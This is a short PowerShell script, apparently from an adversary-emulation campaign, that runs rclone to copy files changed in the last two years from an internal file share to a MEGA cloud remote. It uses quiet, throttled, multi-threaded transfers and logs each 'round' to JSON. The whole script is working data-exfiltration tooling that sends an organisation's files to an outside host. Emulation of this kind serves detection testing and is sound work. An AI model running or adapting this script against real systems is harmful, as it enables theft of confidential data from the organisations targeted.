<#
.SYNOPSIS
    Run one exfiltration round with the campaign flag set and record the result.
.EXAMPLE
    $env:C0015_MEGA_USER='...'; $env:C0015_MEGA_PASS='...'
    .\rclone-exfil.ps1 -Source '\\FS01\Shares' -Remote 'Mega:DATA' -Round 1
#>
param(
    [Parameter(Mandatory)][string]$Source,
    [string]$Remote = 'Mega:DATA',
    [ValidateSet(1,2)][int]$Round = 1,
    [string]$Rclone = 'rclone.exe'
)

$args = @(
    'copy', '--max-age', '2y', $Source, $Remote,
    '-q', '--ignore-existing', '--auto-confirm',
    '--multi-thread-streams', '7', '--transfers', '7', '--bwlimit', '10M'
)
$started = [DateTime]::UtcNow
Write-Host "round $Round start $($started.ToString('o'))"
Write-Host "$Rclone $($args -join ' ')"

& $Rclone @args
$code = $LASTEXITCODE
$ended = [DateTime]::UtcNow
$minutes = [math]::Round(($ended - $started).TotalMinutes, 2)

[pscustomobject]@{
    round = $Round; exit_code = $code
    started_utc = $started.ToString('o'); ended_utc = $ended.ToString('o')
    duration_min = $minutes
} | ConvertTo-Json | Set-Content -LiteralPath (Join-Path $PSScriptRoot "exfil-round$Round.json")
Write-Host "round $Round finished, exit $code, $minutes min"
